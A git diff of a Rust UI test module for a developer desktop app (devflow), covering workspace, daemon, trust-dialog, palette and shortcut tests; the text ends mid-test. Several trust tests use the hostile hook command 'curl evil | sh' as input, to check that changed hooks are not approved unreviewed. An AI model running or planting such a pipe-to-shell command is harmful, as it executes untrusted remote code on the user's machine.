@@ -2,41 +2,51 @@
 //! layout and borrow panics that unit tests on plain data cannot, and checks
 //! that the main controls are laid out with a real size), plus one mutation
 //! driven end to end against the real core.
-use super::Shell;
+use super::{
+    Shell,
+    sidebar::{new_workspace_id, project_id, workspace_id},
+};
 use crate::{
     activity::Activity,
     jobs::{self, Done, Event, LoadError, Refreshed},
     model::{
         ConfigModel, DatabaseModel, LoadPhase, LogFile, LogsModel, Page, PitchforkModel,
-        ProjectModel, Tab,
+        ProjectModel, ProjectSummary, SummaryStamp, Tab, WorkspaceState, WorkspaceSummary,
+        workspace_summaries,
     },
     ops::{FailureHint, JobMeta, TrustChoice},
-    settings::Settings,
-    state::{AppEvent, AppState, MAX_JOBS},
+    settings::{Settings, ThemeChoice},
+    state::{AppEvent, AppState, MAX_JOBS, TrustPurpose},
 };
 use chrono::Utc;
 use devflow_core::{
     config::{
         Config, ConfigDocument, CowCapability, HooksSection, PostgresMode, PostgresSection,
-        ProjectSection,
+        ProjectSection, ServiceConfig,
     },
     db::{BranchInfo, CowSource, RecordStatus, ServerStatus, SnapshotInfo},
-    pitchfork::Daemon,
+    pitchfork::Detection,
+    processes::{
+        DaemonState, Gate, Namespace, NamespaceSource, Observation, ProcessStatus, Refusal,
+    },
     project::Project,
-    receipt::{DataBinding, Phase, PhaseState, Receipt, Status},
+    receipt::{DataBinding, Phase, PhaseState, Receipt, ServiceBinding, Status},
     registry::Entry,
     setup::WorkspaceStatus,
     trust::TrustState,
     worktree::Workspace,
 };
 use gpui_kit::{
-    AppContext as _, Entity, TestAppContext, WindowHandle, base::Root, component::WindowExt as _,
-    px, size, test::TestWindowExt as _,
+    AppContext as _, Entity, TestAppContext, WindowHandle,
+    base::Root,
+    component::{ActiveTheme as _, TITLE_BAR_HEIGHT, Theme, ThemeMode, WindowExt as _},
+    px, size,
+    test::TestWindowExt as _,
 };
 use std::{cell::RefCell, path::PathBuf, rc::Rc, sync::Arc, time::Duration};
 use uuid::Uuid;
 
-fn workspace(name: &str, is_default: bool) -> Workspace {
+pub(super) fn workspace(name: &str, is_default: bool) -> Workspace {
     Workspace {
         name: name.into(),
         branch: Some(name.into()),
@@ -50,23 +60,29 @@ fn workspace(name: &str, is_default: bool) -> Workspace {
     }
 }
 
-fn ready_receipt(name: &str, branch: Uuid) -> Receipt {
+pub(super) fn ready_receipt(name: &str, branch: Uuid) -> Receipt {
     let mut receipt = Receipt::new(Uuid::new_v4(), name, None);
     for phase in Phase::ALL {
         receipt.set_phase(phase, PhaseState::Done, None);
     }
-    receipt.data = Some(DataBinding {
-        branch_id: Some(branch),
-        database: format!("df_{name}"),
-        role: "dfl_x".into(),
-        url: "postgres://x".into(),
-        source: "empty".into(),
-        owned: true,
-    });
+    receipt.services.insert(
+        "db".into(),
+        ServiceBinding::postgres(
+            DataBinding {
+                branch_id: Some(branch),
+                database: format!("df_{name}"),
+                role: "dfl_x".into(),
+                url: "postgres://x".into(),
+                source: "empty".into(),
+                owned: true,
+            },
+            None,
+        ),
+    );
     receipt
 }
 
-fn branch(id: Uuid, name: &str) -> BranchInfo {
+pub(super) fn branch(id: Uuid, name: &str) -> BranchInfo {
     BranchInfo {
         id,
         name: name.into(),
@@ -81,13 +97,113 @@ fn branch(id: Uuid, name: &str) -> BranchInfo {
         created_at: Utc::now(),
         size_bytes: Some(392 * 1024 * 1024),
         generation: 0,
+        extras: Vec::new(),
         warnings: Vec::new(),
+    }
+}
+
+pub(super) fn installed() -> Detection {
+    Detection {
+        path: Some(PathBuf::from("/usr/local/bin/pitchfork")),
+        installed: true,
+        version: Some("2.29.0".into()),
+        missing_features: Vec::new(),
+        problem: None,
+    }
+}
+
+pub(super) fn daemon(
+    name: &str,
+    state: &str,
+    ports: &[u16],
+    url: Option<&str>,
+    startable: bool,
+) -> DaemonState {
+    DaemonState {
+        name: name.into(),
+        id: (state != "not started").then(|| format!("df-0b3c9d2e-a1b2c3d4/{name}")),
+        state: state.into(),
+        pid: (state == "running").then_some(4242),
+        ports: ports.to_vec(),
+        url: url.map(str::to_string),
+        error: None,
+        triggers: Vec::new(),
+        configured: true,
+        startable,
+    }
+}
+
+pub(super) fn allowed() -> Gate {
+    Gate {
+        allowed: true,
+        reason: None,
+        refusal: None,
+    }
+}
+
+pub(super) fn refused(refusal: Refusal) -> Gate {
+    Gate {
+        allowed: false,
+        reason: Some(refusal.to_string()),
+        refusal: Some(refusal),
+    }
+}
+
+/// What core reports for `workspace` at `path`: pitchfork runs, nothing is
+/// refused, the proxy is on. Tests change the parts they are about.
+pub(super) fn process_status(
+    workspace: &str,
+    path: &str,
+    daemons: Vec<DaemonState>,
+) -> ProcessStatus {
+    ProcessStatus {
+        workspace: workspace.into(),
+        path: PathBuf::from(path),
+        instance: None,
+        namespace: Namespace {
+            value: "df-0b3c9d2e-a1b2c3d4".into(),
+            source: NamespaceSource::Devflow,
+        },
+        installed: true,
+        version: Some("2.29.0".into()),
+        configured: true,
+        supervisor_up: Some(true),
+        daemons,
+        observation: Observation::observed(),
+        proxy: Some(devflow_core::pitchfork::ProxyStatus {
+            enabled: true,
+            scheme: Some("https".into()),
+            tld: Some("localhost".into()),
+            port: Some(443),
+            trusted: Some(true),
+            projects: Vec::new(),
+        }),
+        error: None,
+        can_start: allowed(),
+        can_stop: allowed(),
+        autostart: false,
+        autostart_blocked: None,
+    }
+}
+
+pub(super) fn pitchfork_model(
+    workspace: &str,
+    path: &str,
+    daemons: Vec<DaemonState>,
+) -> PitchforkModel {
+    PitchforkModel {
+        loaded: true,
+        detection: Some(installed()),
+        install: None,
+        status: Some(process_status(workspace, path, daemons)),
+        all: Vec::new(),
+        error: None,
     }
 }
 
 /// A fully loaded project: workspaces in every state, a running server,
 /// branches (one unattached), a snapshot, a daemon, config and logs.
-fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
+pub(super) fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
     let entry = Entry {
         id: Uuid::new_v4(),
         name: "shop".into(),
@@ -127,6 +243,7 @@ fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
         running: true,
         reachable: true,
         endpoint: Some("127.0.0.1:55432".into()),
+        container_endpoint: None,
         server_version: Some("18.1".into()),
         file_copy_method: Some("clone".into()),
         cow: CowCapability::Verified,
@@ -148,23 +265,29 @@ fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
         created_at: Utc::now(),
         warnings: Vec::new(),
     }];
-    model.pitchfork = PitchforkModel {
-        loaded: true,
-        available: true,
-        daemons: vec![Daemon {
-            id: "shop/web".into(),
-            status: "running".into(),
-            pid: Some(4242),
-            dir: Some(PathBuf::from("/tmp/shop/main")),
-        }],
-        error: None,
-    };
+    model.pitchfork = pitchfork_model(
+        "main",
+        "/tmp/shop/main",
+        vec![
+            daemon(
+                "web",
+                "running",
+                &[3000],
+                Some("https://web.main.localhost"),
+                false,
+            ),
+            daemon("api", "not started", &[], None, true),
+        ],
+    );
     let config = Config {
         project: ProjectSection {
             name: "shop".into(),
             id: model.key.project,
         },
-        postgres: Some(PostgresSection::default()),
+        services: std::collections::BTreeMap::from([(
+            "db".to_string(),
+            ServiceConfig::Postgres(PostgresSection::default()),
+        )]),
         hooks: HooksSection {
             setup: vec!["mise install".into(), "bun install".into()],
             switch: vec!["bun install --frozen-lockfile".into()],
@@ -182,6 +305,7 @@ fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
     model.trust = Some(TrustState::Untrusted {
         digest: "x".into(),
         previously_trusted: false,
+        format_changed: false,
     });
     let doc = ConfigDocument {
         path: PathBuf::from("/tmp/shop/devflow.toml"),
@@ -203,14 +327,17 @@ fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
     model
 }
 
-struct Harness {
-    window: WindowHandle<Root>,
-    state: Entity<AppState>,
-    shell: Entity<Shell>,
+pub(super) struct Harness {
+    pub(super) window: WindowHandle<Root>,
+    pub(super) state: Entity<AppState>,
+    pub(super) shell: Entity<Shell>,
 }
 
-fn open(cx: &mut TestAppContext, install: impl FnOnce(&mut AppState)) -> Harness {
-    cx.update(gpui_kit::init);
+pub(super) fn open(cx: &mut TestAppContext, install: impl FnOnce(&mut AppState)) -> Harness {
+    cx.update(|cx| {
+        gpui_kit::init(cx);
+        crate::actions::init(cx);
+    });
     let state = cx.new(|_| AppState::for_test(Settings::default()));
     cx.update(|cx| state.update(cx, |s, _| install(s)));
     let for_shell = state.clone();
@@ -235,7 +362,7 @@ fn open(cx: &mut TestAppContext, install: impl FnOnce(&mut AppState)) -> Harness
     }
 }
 
-fn install_loaded(state: &mut AppState) {
+pub(super) fn install_loaded(state: &mut AppState) {
     let dir = tempfile::tempdir().unwrap();
     let model = loaded_model(dir.path());
     state.entries = vec![model.entry.clone()];
@@ -249,7 +376,11 @@ fn install_loaded(state: &mut AppState) {
     std::mem::forget(dir);
 }
 
-fn frame(cx: &mut TestAppContext, h: &Harness, check: impl FnOnce(&mut gpui_kit::Window)) {
+pub(super) fn frame(
+    cx: &mut TestAppContext,
+    h: &Harness,
+    check: impl FnOnce(&mut gpui_kit::Window),
+) {
     cx.update_window(h.window.into(), |_, window, cx| {
         window.render_frame(cx);
         check(window);
@@ -270,7 +401,7 @@ fn every_tab_renders_with_data(cx: &mut TestAppContext) {
         );
     });
     for (tab, probe) in [
-        (Tab::Database, "server-up"),
+        (Tab::Data, "server-up"),
         (Tab::Config, "config-save"),
         (Tab::Logs, "log"),
     ] {
@@ -289,9 +420,16 @@ fn every_tab_renders_with_data(cx: &mut TestAppContext) {
     }
     cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(Tab::Daemons, cx)));
     frame(cx, &h, |window| {
+        for id in ["daemons-start", "daemons-stop", "daemons-restart"] {
+            assert!(window.find(id).visible(), "{id}: the workspace actions");
+        }
         assert!(
-            window.find(("stop", 0usize)).visible(),
+            window.find(("daemon-start", 0usize)).visible(),
             "daemon row actions"
+        );
+        assert!(
+            window.find(("daemon-url", 0usize)).visible(),
+            "the proxy URL is a link"
         );
     });
     cx.update(|cx| h.state.update(cx, |s, cx| s.set_page(Page::Settings, cx)));
@@ -341,7 +479,7 @@ fn activity_panel_follows_progress(cx: &mut TestAppContext) {
         let mut activity = Activity::new(key, "Create workspace feature-y");
         activity.apply([
             Event::Phase {
-                phase: Phase::Database,
+                phase: Phase::Services,
                 state: PhaseState::Started,
                 detail: None,
             },
@@ -386,7 +524,14 @@ fn trust_snapshot_reset_and_initialize_dialogs_render(cx: &mut TestAppContext) {
 
     // Untrusted setup hooks are listed before they run.
     cx.update_window(h.window.into(), |_, window, cx| {
-        super::dialogs::with_trust(&h.state, false, window, cx, |_, _, _| {});
+        super::dialogs::with_trust(
+            &h.state,
+            std::path::Path::new("/tmp/shop/main"),
+            TrustPurpose::Setup,
+            window,
+            cx,
+            |_, _, _| {},
+        );
     })
     .unwrap();
     frame(cx, &h, |window| {
@@ -423,7 +568,7 @@ fn trust_snapshot_reset_and_initialize_dialogs_render(cx: &mut TestAppContext) {
 #[gpui_kit::test]
 fn deleting_a_snapshot_asks_first(cx: &mut TestAppContext) {
     let h = open(cx, install_loaded);
-    cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(Tab::Database, cx)));
+    cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(Tab::Data, cx)));
     frame(cx, &h, |_| {});
     cx.update_window(h.window.into(), |_, window, cx| {
         window.click(("delete-snapshot", 0usize), cx)
@@ -433,22 +578,17 @@ fn deleting_a_snapshot_asks_first(cx: &mut TestAppContext) {
 }
 
 /// A scratch repository initialized for devflow, plus an isolated registry.
-struct Scratch {
+pub(super) struct Scratch {
     _registry: std::sync::MutexGuard<'static, ()>,
     _config: tempfile::TempDir,
-    _outer: tempfile::TempDir,
-    entry: Entry,
+    pub(super) _outer: tempfile::TempDir,
+    pub(super) entry: Entry,
 }
 
-fn scratch_project() -> Scratch {
-    let registry = crate::jobs::REGISTRY_LOCK
-        .lock()
-        .unwrap_or_else(|e| e.into_inner());
-    let config = tempfile::tempdir().unwrap();
-    let outer = tempfile::tempdir().unwrap();
-    let repo = outer.path().join("shop");
-    std::fs::create_dir(&repo).unwrap();
-    unsafe { std::env::set_var("DEVFLOW_CONFIG_DIR", config.path()) };
+/// A git repository at `repo` with one commit, initialized for devflow and
+/// registered (in the registry `DEVFLOW_CONFIG_DIR` points to).
+pub(super) fn init_scratch_repo(repo: &std::path::Path) -> Entry {
+    std::fs::create_dir(repo).unwrap();
     for args in [
         &["init", "-q", "-b", "main"][..],
         &["commit", "-q", "--allow-empty", "-m", "init"][..],
@@ -456,24 +596,34 @@ fn scratch_project() -> Scratch {
         let status = std::process::Command::new("git")
             .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
             .args(args)
-            .current_dir(&repo)
+            .current_dir(repo)
             .status()
             .unwrap();
         assert!(status.success());
     }
     let project = devflow_core::project::init(
-        &repo,
+        repo,
         devflow_core::project::InitOptions {
             name: None,
             postgres: None,
         },
     )
     .unwrap();
-    let entry = Entry {
+    Entry {
         id: project.id(),
         name: project.name().to_string(),
         root: project.root.clone(),
-    };
+    }
+}
+
+pub(super) fn scratch_project() -> Scratch {
+    let registry = crate::jobs::REGISTRY_LOCK
+        .lock()
+        .unwrap_or_else(|e| e.into_inner());
+    let config = tempfile::tempdir().unwrap();
+    let outer = tempfile::tempdir().unwrap();
+    unsafe { std::env::set_var("DEVFLOW_CONFIG_DIR", config.path()) };
+    let entry = init_scratch_repo(&outer.path().join("shop"));
     Scratch {
         _registry: registry,
         _config: config,
@@ -482,8 +632,13 @@ fn scratch_project() -> Scratch {
     }
 }
 
+/// Another project in the same scratch registry.
+pub(super) fn another_scratch_project(scratch: &Scratch, name: &str) -> Entry {
+    init_scratch_repo(&scratch._outer.path().join(name))
+}
+
 /// Drive the executor (and its fake clock) until `done` holds.
-fn settle(cx: &mut TestAppContext, h: &Harness, done: impl Fn(&AppState) -> bool) {
+pub(super) fn settle(cx: &mut TestAppContext, h: &Harness, done: impl Fn(&AppState) -> bool) {
     for _ in 0..200 {
         cx.executor()
             .advance_clock(std::time::Duration::from_millis(150));
@@ -504,7 +659,7 @@ fn settle(cx: &mut TestAppContext, h: &Harness, done: impl Fn(&AppState) -> bool
     panic!("the UI never settled: {report}");
 }
 
-fn open_scratch(cx: &mut TestAppContext, scratch: &Scratch) -> Harness {
+pub(super) fn open_scratch(cx: &mut TestAppContext, scratch: &Scratch) -> Harness {
     let entry = scratch.entry.clone();
     let h = open(cx, |state| {
         state.inflight = 0;
@@ -670,7 +825,7 @@ fn force_is_offered_only_after_a_protection_error(cx: &mut TestAppContext) {
 
 // ---- regressions from the code review ---------------------------------------
 
-fn update<R>(
+pub(super) fn update<R>(
     cx: &mut TestAppContext,
     h: &Harness,
     f: impl FnOnce(&mut AppState, &mut gpui_kit::Context<AppState>) -> R,
@@ -792,6 +947,11 @@ fn a_job_that_vanishes_without_a_result_does_not_keep_the_project_locked(cx: &mu
     settle(cx, &h, |s| s.busy().is_none());
 }
 
+/// The commands of a hook phase of a reviewed scope.
+fn runs(entries: &[devflow_core::trust::HookScope]) -> Vec<&str> {
+    entries.iter().map(|e| e.run.as_str()).collect()
+}
+
 #[gpui_kit::test]
 fn the_trust_dialog_shows_the_whole_hooks_section_that_trusting_approves(cx: &mut TestAppContext) {
     let h = open(cx, install_loaded);
@@ -799,9 +959,14 @@ fn the_trust_dialog_shows_the_whole_hooks_section_that_trusting_approves(cx: &mu
     let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
     let recorded = answers.clone();
     cx.update_window(h.window.into(), |_, window, cx| {
-        super::dialogs::with_trust(&h.state, false, window, cx, move |choice, _, _| {
-            recorded.borrow_mut().push(choice)
-        });
+        super::dialogs::with_trust(
+            &h.state,
+            std::path::Path::new("/tmp/shop/main"),
+            TrustPurpose::Setup,
+            window,
+            cx,
+            move |choice, _, _| recorded.borrow_mut().push(choice),
+        );
     })
     .unwrap();
     frame(cx, &h, |window| {
@@ -823,10 +988,10 @@ fn the_trust_dialog_shows_the_whole_hooks_section_that_trusting_approves(cx: &mu
     let reviewed = cx.read_entity(&h.state, |s, _| {
         devflow_core::trust::scope(s.selection.current().unwrap().project.as_ref().unwrap())
     });
-    assert_eq!(reviewed.teardown, ["docker compose down"]);
+    assert_eq!(runs(&reviewed.hooks.teardown), ["docker compose down"]);
     assert_eq!(
         *answers.borrow(),
-        [TrustChoice::Reviewed(reviewed)],
+        [TrustChoice::Reviewed(Box::new(reviewed))],
         "'Run once' runs exactly the content that was shown"
     );
 }
@@ -838,9 +1003,14 @@ fn a_trust_answer_is_dropped_when_another_project_was_selected(cx: &mut TestAppC
     let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
     let recorded = answers.clone();
     cx.update_window(h.window.into(), |_, window, cx| {
-        super::dialogs::with_trust(&h.state, false, window, cx, move |choice, _, _| {
-            recorded.borrow_mut().push(choice)
-        });
+        super::dialogs::with_trust(
+            &h.state,
+            std::path::Path::new("/tmp/shop/main"),
+            TrustPurpose::Setup,
+            window,
+            cx,
+            move |choice, _, _| recorded.borrow_mut().push(choice),
+        );
     })
     .unwrap();
     std::thread::sleep(Duration::from_millis(300));
@@ -883,9 +1053,9 @@ fn approving_stores_exactly_the_reviewed_hooks_and_rejects_changed_ones() {
     write_hooks("\"echo one\"");
     let project = Project::open(&root).unwrap();
     let reviewed = trust::scope(&project);
-    assert_eq!(reviewed.setup, ["echo one"]);
-    assert_eq!(reviewed.switch, ["echo switch"]);
-    assert_eq!(reviewed.teardown, ["echo bye"]);
+    assert_eq!(runs(&reviewed.hooks.setup), ["echo one"]);
+    assert_eq!(runs(&reviewed.hooks.switch), ["echo switch"]);
+    assert_eq!(runs(&reviewed.hooks.teardown), ["echo bye"]);
     assert!(matches!(
         trust::state(&project).unwrap(),
         trust::TrustState::Untrusted { .. }
@@ -898,12 +1068,12 @@ fn approving_stores_exactly_the_reviewed_hooks_and_rejects_changed_ones() {
         message,
         project: fresh,
         scope,
-    } = approve_reviewed(&project, &reviewed)
+    } = approve_reviewed(&project, &root, &reviewed)
     else {
         panic!("a changed [hooks] section must not be approved");
     };
     assert!(message.contains("changed"), "{message}");
-    assert!(scope.setup.contains(&"curl evil | sh".to_string()));
+    assert!(runs(&scope.hooks.setup).contains(&"curl evil | sh"));
     assert!(matches!(
         trust::state(&fresh).unwrap(),
         trust::TrustState::Untrusted { .. }
@@ -911,7 +1081,7 @@ fn approving_stores_exactly_the_reviewed_hooks_and_rejects_changed_ones() {
 
     // Reviewing the new content and approving it works.
     assert!(matches!(
-        approve_reviewed(&fresh, &scope),
+        approve_reviewed(&fresh, &root, &scope),
         Approval::Approved
     ));
     assert_eq!(trust::state(&fresh).unwrap(), trust::TrustState::Trusted);
@@ -946,15 +1116,20 @@ fn trust_and_run_approves_what_was_shown_and_reopens_when_the_hooks_changed(
     let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
     let recorded = answers.clone();
     cx.update_window(h.window.into(), |_, window, cx| {
-        super::dialogs::with_trust(&h.state, false, window, cx, move |choice, _, _| {
-            recorded.borrow_mut().push(choice)
-        });
+        super::dialogs::with_trust(
+            &h.state,
+            &root,
+            TrustPurpose::Setup,
+            window,
+            cx,
+            move |choice, _, _| recorded.borrow_mut().push(choice),
+        );
     })
     .unwrap();
     std::thread::sleep(Duration::from_millis(300));
     frame(cx, &h, |_| {});
     let shown = model_trust(cx).1;
-    assert_eq!(shown.setup, ["echo one"]);
+    assert_eq!(runs(&shown.hooks.setup), ["echo one"]);
 
     // The file changes after the user looked at it; then they click Trust.
     write_hooks("\"echo one\", \"curl evil | sh\"");
@@ -981,7 +1156,7 @@ fn trust_and_run_approves_what_was_shown_and_reopens_when_the_hooks_changed(
         "nothing was approved: {state:?}"
     );
     assert_eq!(
-        now.setup,
+        runs(&now.hooks.setup),
         ["echo one", "curl evil | sh"],
         "the dialog now holds the new content"
     );
@@ -993,7 +1168,7 @@ fn trust_and_run_approves_what_was_shown_and_reopens_when_the_hooks_changed(
         cx.executor().advance_clock(Duration::from_millis(150));
         cx.run_until_parked();
     }
-    assert_eq!(*answers.borrow(), [TrustChoice::Reviewed(now)]);
+    assert_eq!(*answers.borrow(), [TrustChoice::Reviewed(Box::new(now))]);
     let project = cx.read_entity(&h.state, |s, _| {
         s.selection.current().unwrap().project.clone().unwrap()
     });
@@ -1099,7 +1274,7 @@ fn the_config_editor_follows_the_selected_project_and_save_is_bound_to_its_docum
     assert_eq!(config_text(cx, &h), edited, "the saved document is current");
 }
 
-fn refreshed(h: &Harness, cx: &mut TestAppContext, daemon: &str) -> Refreshed {
+fn refreshed(h: &Harness, cx: &mut TestAppContext, daemon_name: &str) -> Refreshed {
     let (project, workspaces) = cx.read_entity(&h.state, |s, _| {
         let model = s.selection.current().unwrap();
         (model.project.clone().unwrap(), model.workspaces.clone())
@@ -1108,18 +1283,13 @@ fn refreshed(h: &Harness, cx: &mut TestAppContext, daemon: &str) -> Refreshed {
         project,
         workspaces: Ok(workspaces),
         database: DatabaseModel::default(),
+        services: crate::services::ServicesModel::default(),
         trust: Ok(TrustState::Trusted),
-        pitchfork: Some(PitchforkModel {
-            loaded: true,
-            available: true,
-            daemons: vec![Daemon {
-                id: daemon.into(),
-                status: "running".into(),
-                pid: None,
-                dir: None,
-            }],
-            error: None,
-        }),
+        pitchfork: Some(pitchfork_model(
+            "main",
+            "/tmp/shop/main",
+            vec![daemon(daemon_name, "running", &[], None, false)],
+        )),
         config: None,
         logs: None,
     }
@@ -1134,9 +1304,9 @@ fn a_refresh_for_another_workspace_is_dropped(cx: &mut TestAppContext) {
                 .current()
                 .unwrap()
                 .pitchfork
-                .daemons
+                .daemons()
                 .iter()
-                .map(|d| d.id.clone())
+                .map(|d| d.name.clone())
                 .collect::<Vec<_>>()
         })
     };
@@ -1567,4 +1737,1520 @@ fn a_changed_on_disk_toast_cannot_reload_another_project_over_its_unsaved_edits(
         doc_b.content,
         "B's file was not written"
     );
+}
+
+// ---- title bar, shortcuts, palette, theme and the sidebar tree -----------------
+
+/// Press a key with whatever focus there is, and let what it started finish.
+pub(super) fn press_key(cx: &mut TestAppContext, h: &Harness, key: &str) {
+    cx.update_window(h.window.into(), |_, window, cx| window.press(key, cx))
+        .unwrap();
+    cx.run_until_parked();
+}
+
+fn page_and_tab(cx: &mut TestAppContext, h: &Harness) -> (Page, Tab) {
+    cx.read_entity(&h.state, |s, _| (s.page, s.tab))
+}
+
+fn is_dark(cx: &mut TestAppContext) -> bool {
+    cx.update(|cx| cx.theme().is_dark())
+}
+
+fn dialog_is_open(cx: &mut TestAppContext, h: &Harness) -> bool {
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.render_frame(cx);
+        window.try_find("dialog").is_some()
+    })
+    .unwrap()
+}
+
+#[gpui_kit::test]
+fn the_title_bar_has_search_refresh_and_the_theme_switch(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |window| {
+        for id in ["palette", "refresh", "theme-toggle"] {
+            let button = window.find(id);
+            assert!(button.visible(), "{id} is laid out");
+            assert!(
+                button.bounds().bottom() <= TITLE_BAR_HEIGHT,
+                "{id} is in the title bar"
+            );
+        }
+        // The page starts under the bar.
+        assert!(window.find("new-workspace").bounds().top() >= TITLE_BAR_HEIGHT);
+    });
+    // The search button is the palette's other way in.
+    cx.update_window(h.window.into(), |_, window, cx| window.click("palette", cx))
+        .unwrap();
+    cx.run_until_parked();
+    frame(cx, &h, |window| {
+        assert!(window.find("command").visible(), "the palette opened")
+    });
+}
+
+#[gpui_kit::test]
+fn shortcuts_work_with_nothing_focused(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |_| {});
+    cx.update_window(h.window.into(), |_, window, cx| {
+        assert!(!window.has_focused_input(cx), "nothing has the cursor");
+    })
+    .unwrap();
+
+    for (key, tab) in [
+        ("secondary-2", Tab::Data),
+        ("secondary-3", Tab::Daemons),
+        ("secondary-4", Tab::Setup),
+        ("secondary-5", Tab::Config),
+        ("secondary-6", Tab::Logs),
+        ("secondary-1", Tab::Workspaces),
+    ] {
+        press_key(cx, &h, key);
+        assert_eq!(page_and_tab(cx, &h), (Page::Project, tab), "{key}");
+    }
+    press_key(cx, &h, "secondary-,");
+    assert_eq!(page_and_tab(cx, &h).0, Page::Settings);
+    // A tab shortcut leaves the settings page too.
+    press_key(cx, &h, "secondary-3");
+    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Daemons));
+}
+
+#[gpui_kit::test]
+fn the_refresh_shortcut_refreshes_the_selected_project(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |_| {});
+    update(cx, &h, |s, _| s.inflight = 0);
+    // No `run_until_parked`: the job is still running (and would find no
+    // project at the fake path).
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.press("secondary-r", cx)
+    })
+    .unwrap();
+    assert!(
+        cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().refreshing),
+        "a refresh started"
+    );
+}
+
+#[gpui_kit::test]
+fn the_new_workspace_shortcut_opens_the_dialog_and_dialogs_are_modal(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    update(cx, &h, |s, _| s.tab = Tab::Data);
+    frame(cx, &h, |_| {});
+    press_key(cx, &h, "secondary-n");
+    assert!(dialog_is_open(cx, &h), "the dialog opened");
+    assert_eq!(
+        page_and_tab(cx, &h),
+        (Page::Project, Tab::Workspaces),
+        "the output of the new workspace is shown there"
+    );
+
+    // Behind a dialog the page does not move ...
+    press_key(cx, &h, "secondary-2");
+    press_key(cx, &h, "secondary-,");
+    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Workspaces));
+    // ... and a second dialog does not pile up.
+    press_key(cx, &h, "secondary-n");
+    press_key(cx, &h, "secondary-k");
+    frame(cx, &h, |window| {
+        assert!(window.try_find("command").is_none(), "no palette on top");
+        window.find("dialog");
+    });
+
+    press_key(cx, &h, "escape");
+    assert!(!dialog_is_open(cx, &h));
+    press_key(cx, &h, "secondary-2");
+    assert_eq!(page_and_tab(cx, &h).1, Tab::Data);
+}
+
+/// Open the palette with its shortcut.
+fn open_palette(cx: &mut TestAppContext, h: &Harness) {
+    press_key(cx, h, "secondary-k");
+    frame(cx, h, |window| {
+        assert!(window.find("command").visible(), "the palette is open");
+    });
+    cx.update_window(h.window.into(), |_, window, cx| {
+        assert!(
+            window.has_focused_input(cx),
+            "the search field has the cursor"
+        );
+    })
+    .unwrap();
+}
+
+/// Open the palette, search for `query`, and choose the first match.
+fn choose(cx: &mut TestAppContext, h: &Harness, query: &str) {
+    open_palette(cx, h);
+    cx.update_window(h.window.into(), |_, window, cx| window.input(query, cx))
+        .unwrap();
+    cx.run_until_parked();
+    cx.update_window(h.window.into(), |_, window, cx| window.press("enter", cx))
+        .unwrap();
+    cx.run_until_parked();
+    frame(cx, h, |window| {
+        assert!(window.try_find("command").is_none(), "choosing closes it");
+    });
+}
+
+fn blog_entry() -> Entry {
+    Entry {
+        id: Uuid::new_v4(),
+        name: "blog".into(),
+        root: PathBuf::from("/tmp/blog"),
+    }
+}
+
+#[gpui_kit::test]
+fn the_palette_filters_and_applies_what_is_chosen(cx: &mut TestAppContext) {
+    let blog = blog_entry();
+    let h = open(cx, {
+        let blog = blog.clone();
+        move |state| {
+            install_loaded(state);
+            state.entries.push(blog);
+        }
+    });
+    frame(cx, &h, |_| {});
+
+    choose(cx, &h, "data");
+    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Data));
+    choose(cx, &h, "settings");
+    assert_eq!(page_and_tab(cx, &h).0, Page::Settings);
+    choose(cx, &h, "daemons");
+    assert_eq!(page_and_tab(cx, &h), (Page::Project, Tab::Daemons));
+
+    let dark = is_dark(cx);
+    choose(cx, &h, "toggle theme");
+    assert_ne!(is_dark(cx), dark, "the theme was switched");
+
+    choose(cx, &h, "blog");
+    assert_eq!(
+        cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key.project),
+        blog.id
+    );
+    assert!(
+        cx.read_entity(&h.state, |s, _| s.is_expanded(blog.id)),
+        "the chosen project is unfolded in the sidebar"
+    );
+}
+
+#[gpui_kit::test]
+fn the_palette_opens_a_daemons_url_shows_how_to_install_pitchfork_and_runs_the_doctor(
+    cx: &mut TestAppContext,
+) {
+    let h = open(cx, install_loaded);
+    update(cx, &h, |s, _| {
+        s.doctor = jobs::DoctorSource::Fixed(vec![devflow_core::doctor::Check {
+            name: "git".into(),
+            status: devflow_core::doctor::CheckStatus::Ok,
+            detail: "git 2.50".into(),
+            hint: None,
+        }]);
+    });
+    frame(cx, &h, |_| {});
+
+    // A daemon's URL opens in the browser.
+    choose(cx, &h, "open web");
+    assert_eq!(
+        cx.opened_url().as_deref(),
+        Some("https://web.main.localhost")
+    );
+
+    // The doctor's checks open in a dialog.
+    open_palette(cx, &h);
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.input("run doctor", cx)
+    })
+    .unwrap();
+    cx.run_until_parked();
+    cx.update_window(h.window.into(), |_, window, cx| window.press("enter", cx))
+        .unwrap();
+    super::setup_tests::wait(cx, "the doctor's checks", |cx| {
+        super::setup_tests::exists(cx, &h, "doctor-checks")
+    });
+    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
+        .unwrap();
+
+    // Pitchfork missing: the entry leads to the Daemons tab, where the
+    // command is shown before anything is run.
+    update(cx, &h, |s, cx| {
+        let model = s.selection.current_mut().unwrap();
+        model.pitchfork.status = None;
+        model.pitchfork.detection = Some(Detection {
+            path: None,
+            installed: false,
+            version: None,
+            missing_features: Vec::new(),
+            problem: None,
+        });
+        cx.notify();
+    });
+    choose(cx, &h, "install pitchfork");
